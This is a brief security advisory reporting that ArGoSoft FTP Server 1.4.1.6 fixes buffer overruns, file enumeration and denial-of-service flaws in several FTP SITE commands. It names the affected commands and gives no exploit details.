ArGoSoft has released version 1.4.1.6 of their FTP Server to address multiple unspecified security vulnerabilities. These issues include three buffer overruns when handling overly long FTP SITE ZIP and SITE COPY commands, a file enumeration issue involving the SITE UNZIP command and user database corruption denial of service attacks via the SITE PASS command.
